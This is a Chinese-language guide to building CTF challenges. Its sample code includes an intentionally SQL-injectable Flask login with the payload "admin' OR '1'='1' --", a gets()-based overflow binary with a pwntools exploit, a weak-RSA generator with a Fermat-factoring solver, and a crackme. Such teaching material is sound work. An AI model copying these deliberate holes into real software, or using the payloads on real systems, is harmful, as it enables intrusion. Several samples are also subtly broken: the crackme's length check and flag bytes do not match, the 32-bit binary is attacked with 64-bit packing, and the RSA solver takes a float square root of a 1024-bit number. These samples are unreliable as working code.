# 💡 題目開發指南

本指南將協助您創建高品質的 CTF 題目，涵蓋設計原則、技術實現和最佳實踐。

## 📋 題目開發概覽

### 設計哲學
- **教育性優先** - 題目應該有明確的學習目標
- **漸進式難度** - 從基礎概念到進階技巧
- **真實場景** - 模擬實際的安全漏洞和攻擊手法
- **創新思維** - 鼓勵創意解法和非傳統思路

### 題目類型分類

#### 📊 按難度分級
- 🍼 **Baby** (50-100分) - 新手友善，基礎概念
- ⭐ **Easy** (100-200分) - 入門級，單一技術點
- ⭐⭐ **Medium** (200-400分) - 中等難度，組合技巧
- ⭐⭐⭐ **Hard** (400-600分) - 高難度，深度理解
- 💀 **Impossible** (600+分) - 極限挑戰，研究級

#### 🎯 按技術分類
- **Web** - 網頁應用安全
- **Pwn** - 二進制漏洞利用
- **Reverse** - 逆向工程
- **Crypto** - 密碼學
- **Forensics** - 數位鑑識
- **Misc** - 雜項技術

#### 🐳 按部署方式
- **靜態附件** - 下載檔案分析
- **靜態容器** - 共用 Web 服務
- **動態附件** - 個人化檔案
- **動態容器** - 獨立容器實例

---

## 🚀 快速開始

### 1. 創建題目結構

```bash
# 使用腳本創建基本結構
uv run scripts/create-challenge.py web sql_injection medium --author YourName

# 手動創建結構
mkdir -p challenges/web/my_challenge/{src,docker,solution,attachments}
cd challenges/web/my_challenge/
```

### 2. 基本檔案結構

```
my_challenge/
├── README.md              # 題目說明文件
├── public.yml             # 公開發布配置
├── private.yml            # 私有配置（含 Flag）
├── src/                   # 題目源碼
│   ├── app.py
│   ├── requirements.txt
│   └── static/
├── docker/                # 容器配置
│   ├── Dockerfile
│   ├── docker-compose.yml
│   └── nginx.conf
├── writeup/               # 🔒 官方解答
│   ├── README.md         # 解答說明
│   ├── solve.py          # 解題腳本（可選）
│   └── exploit.py        # 利用腳本（可選）
├── attachments/           # 提供給參賽者的檔案
│   ├── source.zip
│   └── hints.txt
└── files/                 # 題目相關檔案
    ├── database.sql
    └── config.json
```

### 3. 配置檔案範例

#### public.yml
```yaml
title: "SQL Injection Login Bypass"
category: "web"
difficulty: "medium"
author: "YourName"
points: 300
description: |
  這是一個包含 SQL 注入漏洞的登入系統。
  
  試著繞過登入驗證，取得管理員權限！
  
  提示：萬能密碼是解題的關鍵

# 發布設定
ready_for_release: false
ready_for_deployment: false

# 允許發布的檔案
allowed_files:
  - "src/**"
  - "docker/**"
  - "attachments/*"

# 部署設定
deployment:
  type: "dynamic"  # static/dynamic
  port: 3000
  resources:
    memory: "128Mi"
    cpu: "100m"

# 標籤
tags:
  - "sql-injection"
  - "authentication-bypass"
  - "web-security"

# 學習目標
learning_objectives:
  - "理解 SQL 注入的基本原理"
  - "學習使用萬能密碼繞過登入"
  - "了解參數化查詢的重要性"
```

#### private.yml
```yaml
# 私有配置檔案 - 不會被發布
flag: "is1abCTF{sql_1nj3ct10n_15_d4ng3r0u5}"

# 內部測試資訊
test_accounts:
  - username: "admin"
    password: "admin123"
  - username: "user"
    password: "password"

# 漏洞詳情
vulnerability_details:
  type: "SQL Injection"
  location: "login.php line 25"
  payload: "admin' OR '1'='1' --"

# 開發筆記
notes: |
  - 確保 Flag 只在成功登入後顯示
  - 記得移除 debug 資訊
  - 測試不同的注入 payload
```

---

## 🌐 Web 題目開發

### 1. 基礎 Flask 應用

```python
# src/app.py
from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-secret-key')

# 取得 Flag
FLAG = os.environ.get('FLAG', 'is1abCTF{local_development_flag}')

def init_db():
    """初始化資料庫"""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            is_admin INTEGER DEFAULT 0
        )
    ''')
    
    # 插入測試資料
    cursor.execute(
        "INSERT OR REPLACE INTO users (username, password, is_admin) VALUES (?, ?, ?)",
        ('admin', 'super_secure_password_2024', 1)
    )
    cursor.execute(
        "INSERT OR REPLACE INTO users (username, password, is_admin) VALUES (?, ?, ?)",
        ('guest', 'guest123', 0)
    )
    
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # 故意的 SQL 注入漏洞
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        cursor.execute(query)
        user = cursor.fetchone()
        conn.close()
        
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['is_admin'] = user[3]
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='帳號密碼錯誤')
    
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if session.get('is_admin'):
        return render_template('admin.html', flag=FLAG)
    else:
        return render_template('user.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=3000, debug=False)
```

### 2. HTML 模板

```html
<!-- src/templates/login.html -->
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全登入系統</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h3 class="text-center">🔐 安全登入系統</h3>
                    </div>
                    <div class="card-body">
                        {% if error %}
                        <div class="alert alert-danger">{{ error }}</div>
                        {% endif %}
                        
                        <form method="POST">
                            <div class="mb-3">
                                <label for="username" class="form-label">帳號</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">密碼</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">登入</button>
                        </form>
                        
                        <hr>
                        <div class="text-center">
                            <small class="text-muted">
                                💡 提示：試試看管理員的預設帳號密碼？
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
```

### 3. Docker 配置

```dockerfile
# docker/Dockerfile
FROM python:3.11-slim

# 安裝系統依賴
RUN apt-get update && apt-get install -y \
    sqlite3 \
    && rm -rf /var/lib/apt/lists/*

# 設置工作目錄
WORKDIR /app

# 複製依賴檔案
COPY src/requirements.txt .

# 安裝 Python 依賴
RUN pip install --no-cache-dir -r requirements.txt

# 複製應用程式碼
COPY src/ .

# 創建非 root 用戶
RUN useradd -m -u 1000 ctfuser && chown -R ctfuser:ctfuser /app
USER ctfuser

# 暴露埠號
EXPOSE 3000

# 設置環境變數
ENV FLASK_ENV=production
ENV SECRET_KEY=your-secret-key-here

# 啟動應用
CMD ["python", "app.py"]
```

```yaml
# docker/docker-compose.yml
version: '3.8'

services:
  web-challenge:
    build: .
    ports:
      - "3000:3000"
    environment:
      - FLAG=is1abCTF{sql_1nj3ct10n_15_d4ng3r0u5}
      - SECRET_KEY=your-secret-key-here
    restart: unless-stopped
    
    # 資源限制
    deploy:
      resources:
        limits:
          memory: 128M
          cpus: '0.2'
        reservations:
          memory: 64M
          cpus: '0.1'
    
    # 安全設定
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
```

---

## ⚔️ Pwn 題目開發

### 1. 基本 C 程式

```c
// src/vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("🎉 恭喜！你成功了！\n");
    system("/bin/cat flag.txt");
}

void vulnerable_function() {
    char buffer[64];
    printf("輸入你的名字: ");
    fflush(stdout);
    
    // 故意的緩衝區溢位漏洞
    gets(buffer);
    
    printf("Hello, %s!\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    printf("🎯 歡迎來到 Buffer Overflow 挑戰！\n");
    printf("目標函數位置: %p\n", win);
    
    vulnerable_function();
    
    printf("再見！\n");
    return 0;
}
```

### 2. Makefile

```makefile
# src/Makefile
CC = gcc
CFLAGS = -m32 -fno-stack-protector -z execstack -no-pie
TARGET = vuln
SOURCE = vuln.c

$(TARGET): $(SOURCE)
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE)

debug: $(SOURCE)
	$(CC) $(CFLAGS) -g -o $(TARGET) $(SOURCE)

clean:
	rm -f $(TARGET)

.PHONY: clean debug
```

### 3. NC 服務 Docker 配置

基於 [ctf-nc-example](https://github.com/is1ab/ctf-nc-example) 的配置：

```dockerfile
# docker/Dockerfile
FROM ubuntu:20.04

# 安裝必要套件
RUN apt-get update && apt-get install -y \
    gcc-multilib \
    socat \
    && rm -rf /var/lib/apt/lists/*

# 創建 CTF 用戶
RUN useradd -m ctf

# 設置工作目錄
WORKDIR /home/ctf

# 複製題目檔案
COPY src/vuln.c .
COPY src/Makefile .
COPY src/flag.txt .

# 編譯題目
RUN make

# 設置權限
RUN chown root:ctf vuln && chmod 750 vuln
RUN chown root:ctf flag.txt && chmod 644 flag.txt

# 暴露服務埠
EXPOSE 9999

# 設置啟動腳本
COPY start.sh .
RUN chmod +x start.sh

# 切換到 ctf 用戶
USER ctf

# 啟動 socat 服務
CMD ["./start.sh"]
```

```bash
#!/bin/bash
# docker/start.sh
# 使用 socat 提供 nc 服務
exec socat TCP-LISTEN:9999,reuseaddr,fork EXEC:"./vuln",pty,stderr
```

### 4. 解題腳本

```python
# writeup/solve.py
#!/usr/bin/env python3
from pwn import *

# 設定連線
HOST = 'localhost'
PORT = 9999

def solve():
    # 建立連線
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process('./vuln')
    
    # 如果需要 debug
    if args.DEBUG:
        gdb.attach(io, '''
        break vulnerable_function
        continue
        ''')
    
    # 接收初始輸出並提取 win 函數位址
    output = io.recvuntil(b'目標函數位置: ')
    win_addr = int(io.recvline().strip(), 16)
    log.info(f"Win function address: {hex(win_addr)}")
    
    # 構造 payload
    padding = b'A' * 76  # 64 bytes buffer + 8 bytes rbp + 4 bytes alignment
    win_addr_bytes = p64(win_addr)
    
    payload = padding + win_addr_bytes
    
    log.info(f"Payload length: {len(payload)}")
    log.info(f"Sending payload...")
    
    # 發送 payload
    io.sendline(payload)
    
    # 接收 flag
    try:
        response = io.recvall(timeout=2)
        print(response.decode())
        
        # 尋找 flag
        if b'is1abCTF{' in response:
            flag_start = response.find(b'is1abCTF{')
            flag_end = response.find(b'}', flag_start) + 1
            flag = response[flag_start:flag_end].decode()
            log.success(f"Flag found: {flag}")
            return flag
    except:
        log.error("Failed to receive flag")
    
    io.close()

if __name__ == "__main__":
    flag = solve()
    if flag:
        print(f"\n🎉 Success! Flag: {flag}")
    else:
        print("\n😞 Failed to get flag")
```

---

## 🔐 Crypto 題目開發

### 1. RSA 挑戰範例

```python
# src/rsa_challenge.py
#!/usr/bin/env python3
import random
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes

def generate_weak_rsa():
    """生成故意有弱點的 RSA 金鑰"""
    # 使用相近的質數（為了方便因式分解）
    p = getPrime(512)
    q = getPrime(512)
    
    # 確保 p 和 q 相近（Fermat 分解法）
    while abs(p - q) > 2**510:
        q = getPrime(512)
    
    n = p * q
    e = 65537
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    
    return (n, e, d, p, q)

def encrypt_flag(flag, n, e):
    """加密 flag"""
    m = bytes_to_long(flag.encode())
    c = pow(m, e, n)
    return c

def main():
    flag = "is1abCTF{f3rm4t_f4ct0r1z4t10n_1s_p0w3rful}"
    
    n, e, d, p, q = generate_weak_rsa()
    c = encrypt_flag(flag, n, e)
    
    print("🔐 RSA 加密挑戰")
    print("=" * 50)
    print(f"n = {n}")
    print(f"e = {e}")
    print(f"c = {c}")
    print("=" * 50)
    print("提示：這個 RSA 金鑰有弱點，試試看 Fermat 分解法！")
    
    # 將數據保存到檔案
    with open('public_key.txt', 'w') as f:
        f.write(f"n = {n}\n")
        f.write(f"e = {e}\n")
    
    with open('ciphertext.txt', 'w') as f:
        f.write(f"c = {c}\n")

if __name__ == "__main__":
    main()
```

### 2. 解題腳本

```python
# writeup/solve_rsa.py
#!/usr/bin/env python3
import math
from Crypto.Util.number import long_to_bytes

def fermat_factor(n):
    """Fermat 分解法"""
    a = math.ceil(math.sqrt(n))
    
    while True:
        b_squared = a * a - n
        b = int(math.sqrt(b_squared))
        
        if b * b == b_squared:
            p = a + b
            q = a - b
            if p * q == n:
                return p, q
        
        a += 1
        
        # 防止無限迴圈
        if a > n:
            break
    
    return None, None

def solve():
    # 讀取公鑰和密文
    with open('public_key.txt', 'r') as f:
        lines = f.readlines()
        n = int(lines[0].split(' = ')[1])
        e = int(lines[1].split(' = ')[1])
    
    with open('ciphertext.txt', 'r') as f:
        c = int(f.readline().split(' = ')[1])
    
    print(f"正在分解 n = {n}")
    
    # 使用 Fermat 分解法
    p, q = fermat_factor(n)
    
    if p and q:
        print(f"成功分解！")
        print(f"p = {p}")
        print(f"q = {q}")
        
        # 計算私鑰
        phi = (p - 1) * (q - 1)
        d = pow(e, -1, phi)
        
        # 解密
        m = pow(c, d, n)
        flag = long_to_bytes(m).decode()
        
        print(f"🎉 Flag: {flag}")
        return flag
    else:
        print("分解失敗")
        return None

if __name__ == "__main__":
    solve()
```

---

## 🔍 Reverse 題目開發

### 1. 簡單的逆向挑戰

```c
// src/crackme.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// 簡單的字串混淆
char* obfuscated_flag = "\x7a\x2e\x60\x6f\x64\x52\x39\x44\x0f\x7a\x35\x79\x79\x35\x73\x38\x6a\x08\x7a\x39\x34\x39\x79\x6c\x0c\x3c\x3c\x7a\x2e\x38\x7a\x6b\x09";

void check_password(char* input) {
    // 簡單的密碼檢查邏輯
    int len = strlen(input);
    if (len != 12) {
        printf("❌ 密碼長度錯誤！\n");
        return;
    }
    
    // 簡單的變換
    for (int i = 0; i < len; i++) {
        if ((input[i] ^ 0x42) != "admin_2024"[i]) {
            printf("❌ 密碼錯誤！\n");
            return;
        }
    }
    
    printf("✅ 密碼正確！\n");
    
    // 解密 flag
    printf("🎉 恭喜！你的 Flag 是：");
    for (int i = 0; i < 33; i++) {
        printf("%c", obfuscated_flag[i] ^ 0x42);
    }
    printf("\n");
}

int main() {
    char input[100];
    
    printf("🔐 簡單的密碼破解挑戰\n");
    printf("請輸入正確的密碼來獲得 Flag：");
    
    fgets(input, sizeof(input), stdin);
    
    // 移除換行符號
    input[strcspn(input, "\n")] = 0;
    
    check_password(input);
    
    return 0;
}
```

### 2. 編譯腳本

```bash
#!/bin/bash
# src/build.sh

# 編譯 release 版本
gcc -O2 -s -o crackme crackme.c

# 編譯 debug 版本（用於驗證）
gcc -g -o crackme_debug crackme.c

echo "編譯完成！"
echo "Release: ./crackme"
echo "Debug: ./crackme_debug"
```

---

## 📊 品質檢查清單

### 🔍 安全性檢查
- [ ] 移除所有 debug 資訊和註解
- [ ] Flag 不會意外洩露在程式碼中
- [ ] 沒有硬編碼的敏感資訊
- [ ] 容器運行在非 root 用戶下
- [ ] 適當的資源限制設定

### 📝 文檔完整性
- [ ] `README.md` 包含清楚的題目描述
- [ ] `public.yml` 配置正確且完整
- [ ] 學習目標明確定義
- [ ] 提示適當且有幫助

### 🧪 測試驗證
- [ ] 官方解題腳本可以成功執行
- [ ] Docker 容器可以正常建置和運行
- [ ] 所有預期的攻擊向量都有測試
- [ ] 非預期解法已被考慮和處理

### 🎯 教育價值
- [ ] 有明確的學習目標
- [ ] 難度與目標受眾匹配
- [ ] 包含適當的背景知識說明
- [ ] Writeup 詳細且具教育意義

### 🔧 技術品質
- [ ] 程式碼風格一致
- [ ] 錯誤處理適當
- [ ] 效能符合預期
- [ ] 跨平台相容性良好

---

## 💡 最佳實踐

### 1. 設計原則

**🎯 明確的學習目標**
```yaml
# 在 public.yml 中明確定義
learning_objectives:
  - "理解 SQL 注入的基本原理和危害"
  - "學習使用 UNION 注入技術"
  - "了解防禦措施：參數化查詢"
  - "掌握手動和自動化注入工具的使用"
```

**📈 漸進式難度設計**
- Baby: 直接提示漏洞位置
- Easy: 提供明顯的漏洞特徵
- Medium: 需要一定的分析和技巧
- Hard: 複雜的利用鏈或深度分析

**🌍 真實世界相關性**
- 基於真實的 CVE 或常見漏洞模式
- 使用實際的技術棧和工具
- 模擬真實的攻擊場景

### 2. 開發流程

**📋 規劃階段**
1. 定義學習目標和難度級別
2. 選擇合適的技術棧
3. 設計漏洞和利用方式
4. 規劃部署和資源需求

**🛠️ 實作階段**
1. 搭建基本應用框架
2. 實現核心功能
3. 引入目標漏洞
4. 編寫 Docker 配置

**🧪 測試階段**
1. 功能測試
2. 安全測試
3. 效能測試
4. 解題驗證

**📚 文檔階段**
1. 撰寫題目描述
2. 編寫官方 Writeup
3. 準備提示系統
4. 配置發布參數

### 3. 常見陷阱避免

**🚫 避免非預期解法**
- 仔細檢查所有可能的攻擊面
- 限制不必要的功能和接口
- 使用沙箱環境隔離
- 進行充分的滲透測試

**⚡ 效能最佳化**
- 設定適當的資源限制
- 避免無限迴圈和資源洩漏
- 使用快取減少重複計算
- 監控容器資源使用

**🔒 安全防護**
- 定期更新基礎映像
- 移除不必要的套件
- 使用非 root 用戶執行
- 實施適當的網路隔離

---

## 📚 參考資源

### 🔧 開發工具
- **Docker** - 容器化部署
- **Python/Flask** - Web 應用開發
- **GCC** - C/C++ 編譯
- **pwntools** - Binary exploitation
- **Burp Suite** - Web 安全測試

### 📖 學習資源
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CTF Field Guide](https://trailofbits.github.io/ctf/)
- [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
- [Binary Exploitation](https://wiki.bi0s.in/pwning/intro/)

### 🏆 參考比賽
- **PicoCTF** - 教育導向的 CTF
- **OverTheWire** - 在線 Wargames
- **HackTheBox** - 實戰演練平台
- **DEFCON CTF** - 頂級安全競賽

### 🔗 有用連結
- [CTF NC 範例](https://github.com/is1ab/ctf-nc-example) - PWN 題目的 NC 服務範例
- [Dockerfile 最佳實踐](https://docs.docker.com/develop/dev-best-practices/)
- [Flask 安全指南](https://flask.palletsprojects.com/en/2.0.x/security/)

---

**🎯 透過遵循這份指南，您可以創建出高品質、具教育價值的 CTF 題目！**

---

*最後更新：2025-08-03*